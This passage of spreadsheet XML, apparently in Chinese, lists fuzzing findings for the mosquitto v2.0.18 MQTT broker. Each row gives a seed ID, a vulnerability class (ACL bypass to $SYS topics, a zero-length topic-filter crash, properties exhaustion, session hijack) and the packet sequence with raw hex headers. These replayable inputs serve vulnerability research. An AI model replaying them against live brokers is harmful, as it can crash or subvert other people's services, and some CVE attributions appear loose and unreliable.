      <c r="B22" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C22" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(153B)\u000a4.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22" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0286 ===\u000a大小: 1106B (报告+请求数据)\u000a请求数据: 153B\u000a\u000a---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MQTT请求序列(153B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=True payload_len=118B | raw_header=3b9501001d245359532f62726f6b6572\u000aMsg[2]: PINGREQ  | raw_header=cb</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A23" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000008,sev:3,cat:02c4</t>
        </is>
      </c>
      <c r="B23" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C23" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(21945B)\u000a4.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0x02c4\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E23" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:02c4 ===\u000a大小: 5093B (报告+请求数据)\u000a请求数据: 21945B\u000a\u000a---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MQTT请求序列(21945B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=00030100a0\u000aMsg[2]: DISCONNECT 断开连接 | raw_header=e000\u000aMsg[3]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=334d4d4d4d4d4d4d4d4d4d4d4d4d4d4d\u000aMsg[4]: PUBACK PacketID=19789 | raw_header=4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d\u000aMsg[5]: PUBACK PacketID=19789 | raw_header=4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d\u000aMsg[6]: PUBACK PacketID=19789 | raw_header=4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d\u000aMsg[7]: PUBACK PacketID=19789 | raw_header=4d4d4d4d4d4d4d4d4d4d4d4d4d4d4e4d\u000aMsg[8]: PUBACK PacketID=19789 | raw_header=4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d\u000aMsg[9]: PUBACK PacketID=19789 | raw_header=4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d\u000aMsg[10]: PUBACK PacketID=19789 | raw_header=4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d\u000aMsg[11]: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raw_header=26262626262626262626262626262626\u000a(尾部2982B): 2626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J2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3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4">
      <c r="A24" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000008,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B24" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C24" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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4" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0040 ===\u000a大小: 535B (报告+请求数据)\u000a请求数据: 157B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(157B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=161 Topics=[''(零长度!QoS=3)] | raw_header=824900a100002b766572792f64656570\u000aMsg[2]: PUBLISH Topic='very/deep/topic/level1/level2/level3/level4' QoS=1 retain=False payload='\x00¢\u000d\x01E#&gt;\x93\u0009\x00\x05ý&gt;\x0b¨\x14jC¾\u000a\x06Ö\x87\x98Agù\x834í\x11yaS' | raw_header=3a4f002b766572792f646565702f746f\u000aMsg[3]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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">
      <c r="A25" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000008,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B25" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C25" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c0 ===\u000a大小: 756B (报告+请求数据)\u000a请求数据: 63B\u000a\u000a---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MQTT请求序列(63B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=000961666c6e656f576330\u000aMsg[2]: SUBSCRIBE PacketID=59569 Topics=[''(零长度!QoS=2)] | raw_header=820be8b100000674657302013c\u000aMsg[3]: SUBSCRIBE PacketID=25082 Topics=[] | raw_header=800961face515454040000\u000aMsg[4]: PUBLISH  | raw_header=3c00\u000aMsg[5]: (不完整,26B) raw=0d70657273697374656e745f3031820b00010006740b7f14e009\u000a(尾部26B): 0d70657273697374656e745f3031820b00010006740b7f14e009</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A26" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000008,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B26" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C26" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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6" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c2 ===\u000a大小: 1083B (报告+请求数据)\u000a请求数据: 196B\u000a\u000a---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MQTT请求序列(196B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2089 Topics=[''(零长度!QoS=0)] | raw_header=822608290000142473686172652f6772\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload_len=131B | raw_header=3498010013245359532f62726f6b6572\u000aMsg[3]: DISCONNECT 断开连接 | raw_header=e4</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A27" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000008,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B27" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C27" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(177B)\u000a4.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7" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:02c4 ===\u000a大小: 992B (报告+请求数据)\u000a请求数据: 177B\u000a\u000a---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MQTT请求序列(177B原始二进制) ---\u000aMsg[1]: PINGRESP  | raw_header=d700\u000aMsg[2]: PINGRESP  | raw_header=d700\u000aMsg[3]: SUBSCRIBE PacketID=1101 Topics=[''(零长度!QoS=2)] | raw_header=8210044d00000a746573742f746f7069\u000aMsg[4]: PUBLISH Topic='very/deep/topic/level1/level2/level3/level4' QoS=1 retain=False payload_len=107B | raw_header=3a9801002b766572792f646565702f74</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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8">
      <c r="A28" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000008,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B28" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C28" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(163B)\u000a4.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28" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:02c6 ===\u000a大小: 1310B (报告+请求数据)\u000a请求数据: 163B\u000a\u000a---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MQTT请求序列(163B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1163 Topics=[''(零长度!QoS=0)] | raw_header=8206048b00000025\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=120B | raw_header=319701001d245359532f62726f6b6572\u000aMsg[3]: PINGRESP  | raw_header=d3</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A29" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B29" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C29" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(218B)\u000a4.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9" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0002 ===\u000a大小: 1162B (报告+请求数据)\u000a请求数据: 218B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(218B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=85 Topics=[] | raw_header=82390055260b90bfea0c260009612f62\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload_len=134B | raw_header=389b010013245359532f62726f6b6572\u000aMsg[3]: PUBREC  | raw_header=52</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A30" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:000a</t>
        </is>
      </c>
      <c r="B30" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C30" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(156B)\u000a4.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0" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:000a ===\u000a大小: 1212B (报告+请求数据)\u000a请求数据: 156B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: $SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b CVE=N/A)\u000a\u000a--- MQTT请求序列(156B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=0 Topics=[] | raw_header=8065000002002f7a7a5f757365720009\u000aMsg[2]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=13131313131313131313131313131313\u000aMsg[3]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=131313131313131313136c75656e742d\u000aMsg[4]: (不完整,11B) raw=13f4123a12fe7f0000f313\u000a(尾部11B): 13f4123a12fe7f0000f313</f>
        <v/>
      </c>
      <c r="F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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J3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1">
      <c r="A31" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B31" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C31" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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1" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0082 ===\u000a大小: 713B (报告+请求数据)\u000a请求数据: 140B\u000a\u000a---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MQTT请求序列(140B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=99 Topics=[] | raw_header=82290063050bb9e380670009612f622f\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload_len=73B | raw_header=315e0013245359532f62726f6b65722f\u000aMsg[3]: CONNECT  | raw_header=1a</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A32" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B32" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C32" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(162B)\u000a4.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2" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:00c0 ===\u000a大小: 632B (报告+请求数据)\u000a请求数据: 162B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Excessive v5 user-properties (CPU exhaustion risk) (Cat=0x00c0 Hash=0xa8bb2df4 CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(162B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0100\u000aMsg[2]: TYPE0  | raw_header=0000\u000aMsg[3]: PUBACK PacketID=20046 | raw_header=434f4e4e262626262626262626262626\u000aMsg[4]: TYPE0  | raw_header=0000\u000aMsg[5]: PUBLISH Topic='' QoS=2 retain=False payload='\x14\x00\x00\x00\x01\x00\x00\x80\x00\x00\x00\x00ÿ\x00\x7f\x00\x00\x00\x00\x00\x00\x00\x00ããããããããã' | raw_header=3c220000140000000100008000000000\u000aMsg[6]: (不完整,39B) raw=e37fb5020200e000000002ff007f0000000000000000e3e3e3e3e3e3e3e3e3e37fb5020200e000\u000a(尾部39B): e37fb5020200e000000002ff007f0000000000000000e3e3e3e3e3e3e3e3e3e37fb5020200e000</f>
        <v/>
      </c>
      <c r="F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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J3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32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3">
      <c r="A33" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B33" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C33" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D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3" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0101 ===\u000a大小: 2206B (报告+请求数据)\u000a请求数据: 262B\u000a\u000a---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MQTT请求序列(262B原始二进制) ---\u000aMsg[1]: PUBREC  | raw_header=52014e\u000aMsg[2]: PUBACK PacketID=21514 | raw_header=4543540a101300044d5154540480003c\u000aMsg[3]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=60s [持久会话] | raw_header=101300044d5154540480003c00008000\u000aMsg[4]: SUBSCRIBE PacketID=65535 Topics=[] | raw_header=8240ffffffff24006861524e4e454354\u000aMsg[5]: PUBCOMP PacketID=29813 | raw_header=726174757245574f434f4e4e4543540a\u000aMsg[6]: TYPE0  | raw_header=0100\u000aMsg[7]: (不完整,2B) raw=1c24\u000a(尾部2B): 1c24</f>
        <v/>
      </c>
      <c r="F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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J3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4">
      <c r="A34" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:0103</t>
        </is>
      </c>
      <c r="B34" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C34" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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34" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0103 ===\u000a大小: 4840B (报告+请求数据)\u000a请求数据: 73B\u000a\u000a---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MQTT请求序列(73B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=78 Topics=['$SYS/broker/clients/connected'(QoS=0)] | raw_header=8222004e001d245359532f62726f6b65\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload='h \x16B'\x1aNï\x9a\x85ø\x98ó' | raw_header=30220013245359532f62726f6b65722f\u000aMsg[3]: PUBREC  | raw_header=50</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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5">
      <c r="A35" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:0181</t>
        </is>
      </c>
      <c r="B35" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C35" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(224B)\u000a4.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5" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0181 ===\u000a大小: 2538B (报告+请求数据)\u000a请求数据: 224B\u000a\u000a---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Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(224B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=60s [持久会话] | raw_header=103200044d5154540480003c00008004\u000aMsg[2]: TYPE0  | raw_header=0006746573742f63\u000aMsg[3]: TYPE0  | raw_header=0014e4617473686172652f59332f686f\u000aMsg[4]: PUBREL PacketID=25993 | raw_header=656d6589724b7475726501001c247368\u000aMsg[5]: (不完整,31B) raw=6d652f2b2f74656d706572617475726500f05f2379360b9ed6a7226f6d711e\u000a(尾部31B): 6d652f2b2f74656d706572617475726500f05f2379360b9ed6a7226f6d711e</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J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6">
      <c r="A36" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:0182</t>
        </is>
      </c>
      <c r="B36" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C36" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(214B)\u000a4.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36" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0182 ===\u000a大小: 1017B (报告+请求数据)\u000a请求数据: 214B\u000a\u000a---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CVE=N/A)\u000a\u000a--- MQTT请求序列(214B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=73s Will=YES WillTopic='$SYS/broker/clients/connected' [自动清理会话] | raw_header=104f00044d51545404ce00490000001d\u000aMsg[2]: TYPE0  | raw_header=0100\u000aMsg[3]: TYPE0  | raw_header=00044d515454\u000aMsg[4]: TYPE0  | raw_header=0402003c\u000aMsg[5]: TYPE0  | raw_header=000766757a7a5f6333\u000aMsg[6]: SUBSCRIBE PacketID=521 Topics=['$SYS/broker/version'(QoS=1), '$share/grp/test/topic'(QoS=0), '$SYS/broker/clients/connected'(QoS=1)] | raw_header=825002090013245359532f62726f6b65\u000aMsg[7]: PUBREC PacketID=16979 | raw_header=531c42534352494245101500044d5154</f>
        <v/>
      </c>
      <c r="F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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J3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7">
      <c r="A37" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:0183</t>
        </is>
      </c>
      <c r="B37" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C37" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(279B)\u000a4.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7" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0183 ===\u000a大小: 2657B (报告+请求数据)\u000a请求数据: 279B\u000a\u000a---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MQTT请求序列(279B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=524 Topics=[] | raw_header=824b020c0b0b8189da7b260001740000\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=True payload_len=82B | raw_header=3371001d245359532f62726f6b65722f\u000aMsg[3]: CONNECT Proto=MQ:T v4 ClientID=''(0B) clean_session=False keepalive=60s [持久会话] | raw_header=101300044d513a540480003c00008000\u000aMsg[4]: SUBSCRIBE PacketID=1441 Topics=['$share/g3/home/+/temp/shared'(QoS=3)] | raw_header=824005a1001c2473686172652f67332f</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A38" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:01c1</t>
        </is>
      </c>
      <c r="B38" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C38" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(623B)\u000a4.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38" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:01c1 ===\u000a大小: 1341B (报告+请求数据)\u000a请求数据: 623B\u000a\u000a---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MQTT请求序列(623B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1441 Topics=['$share/g3/èk&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;+ÞÞÞ'(QoS=2)] | raw_header=824005a1001c2473686172652f67332f\u000aMsg[2]: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raw_header=2626262626262626262626262b262626\u000aMsg[5]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626ef2626262626262626\u000aMsg[6]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[7]: CONNACK session_present=38 reason_code=38 | raw_header=262626262d2626262126262626262626\u000aMsg[8]: CONNACK session_present=38 reason_code=38 | raw_header=26262626263d26262626262626262626\u000aMsg[9]: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raw_header=2620262626260f262626262626262626\u000aMsg[15]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[16]: CONNECT  | raw_header=110168</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J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9">
      <c r="A39" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B39" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C39" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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39" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0206 ===\u000a大小: 852B (报告+请求数据)\u000a请求数据: 364B\u000a\u000a---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MQTT请求序列(364B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=001300044d5154540402003c00076675\u000aMsg[2]: SUBSCRIBE PacketID=1673 Topics=['$share/grp1/#'(QoS=1), '$SYS/broker/version'(QoS=2), '$share/grp1/test/+'(QoS=1)] | raw_header=823d0689000d2473686172652f677270\u000aMsg[3]: PUBLISH Topic='$sheeee¢5\x000\x00\x1d$SYS/bro' QoS=1 retain=False payload_len=47B | raw_header=3a46001524736865656565a235003000\u000aMsg[4]: PUBREL PacketID=25957 | raw_header=6565656565656565656b656565656565\u000aMsg[5]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[6]: (不完整,2B) raw=6565\u000a(尾部2B): 6565</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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0">
      <c r="A40" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B40" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C40" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(136B)\u000a4.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0" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0286 ===\u000a大小: 1136B (报告+请求数据)\u000a请求数据: 136B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev1】MQTT: Retained message (potential resource exhaustion) (Cat=0x0080 Hash=0xc7f41b6e CVE=CVE-2023-3592)\u000a【Sev3】MQTT: Will message targets $SYS topic (privilege escalation) (Cat=0x0002 Hash=0xc812f950 CVE=N/A)\u000a【Sev2】MQTT: Duplicate packet identifier (replay/session hijack) (Cat=0x0204 Hash=0xcc642ed8 CVE=N/A)\u000a\u000a--- MQTT请求序列(136B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v5 ClientID=''(9990B) clean_session=True keepalive=114s Will=YES [自动清理会话] | raw_header=10840100044d51545405ce0072412706\u000aMsg[2]: AUTH  | raw_header=f2</f>
        <v/>
      </c>
      <c r="F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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J4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1">
      <c r="A41" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:028e</t>
        </is>
      </c>
      <c r="B41" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C41" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
